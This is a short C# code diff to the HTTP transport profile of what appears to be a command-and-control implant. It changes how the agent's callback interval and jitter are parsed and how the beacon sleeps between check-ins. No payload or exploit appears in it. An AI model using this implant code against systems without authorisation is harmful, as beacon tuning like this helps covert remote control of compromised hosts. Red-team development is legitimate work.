@@ -18,7 +18,7 @@ namespace HttpTransport
     public class HttpProfile : C2Profile, IC2Profile
     {
         private int CallbackInterval;
-        private int CallbackJitter;
+        private double CallbackJitter;
         private int CallbackPort;
         private string CallbackHost;
         private string PostUri;
@@ -39,8 +39,8 @@ namespace HttpTransport
 
         public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
-            CallbackInterval = int.Parse(data["callback_interval"]) * 1000;
-            CallbackJitter = int.Parse(data["callback_jitter"]);
+            CallbackInterval = int.Parse(data["callback_interval"]);
+            CallbackJitter = double.Parse(data["callback_jitter"]);
             CallbackPort = int.Parse(data["callback_port"]);
             CallbackHost = data["callback_host"];
             PostUri = data["post_uri"];
@@ -81,6 +81,7 @@ namespace HttpTransport
                     WebRequest.DefaultWebProxy = null;
                 }
             }
+            Agent.SetSleep(CallbackInterval, CallbackJitter);
         }
 
         public void Start()
@@ -98,7 +99,7 @@ namespace HttpTransport
                     break;
                 }
 
-                Thread.Sleep(Agent.GetSleep());
+                Agent.Sleep();
             }
         }
 
